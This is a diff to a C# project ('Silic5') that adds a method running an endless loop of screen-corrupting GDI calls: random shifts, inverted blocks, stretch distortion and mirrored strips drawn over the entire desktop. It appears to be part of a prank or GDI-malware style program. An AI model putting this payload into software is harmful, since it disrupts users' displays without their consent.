@@ -113,6 +113,73 @@ namespace Silic5
                 }
             }
         }
+        public void gdi_old()
+        {
+            Random rnd = new Random();
+
+            while (true)
+            {
+                IntPtr hdc = GetDC(IntPtr.Zero);
+
+                int w = Screen.PrimaryScreen.Bounds.Width;
+                int h = Screen.PrimaryScreen.Bounds.Height;
+
+                // Random screen feedback shift
+                BitBlt(
+                    hdc,
+                    rnd.Next(-20, 20),
+                    rnd.Next(-20, 20),
+                    w,
+                    h,
+                    hdc,
+                    0,
+                    0,
+                    TernaryRasterOperations.SRCCOPY);
+
+                // Color inversion blocks
+                PatBlt(
+                    hdc,
+                    rnd.Next(w),
+                    rnd.Next(h),
+                    rnd.Next(50, 300),
+                    rnd.Next(50, 300),
+                    TernaryRasterOperations.PATPAINT);
+
+                // Random stretch distortion
+                StretchBlt(
+                    hdc,
+                    rnd.Next(-50, 50),
+                    rnd.Next(-50, 50),
+                    w + rnd.Next(-100, 100),
+                    h + rnd.Next(-100, 100),
+                    hdc,
+                    0,
+                    0,
+                    w,
+                    h,
+                    TernaryRasterOperations.SRCCOPY);
+
+                // Mirror strips
+                int y = rnd.Next(h);
+                int hh = rnd.Next(10, 80);
+
+                StretchBlt(
+                    hdc,
+                    0,
+                    y,
+                    w,
+                    hh,
+                    hdc,
+                    w,
+                    y,
+                    -w,
+                    hh,
+                    TernaryRasterOperations.SRCCOPY);
+
+                ReleaseDC(IntPtr.Zero, hdc);
+                Thread.Sleep(15);
+            }
+        }
         public void window_shake()
         {
             Random rand;
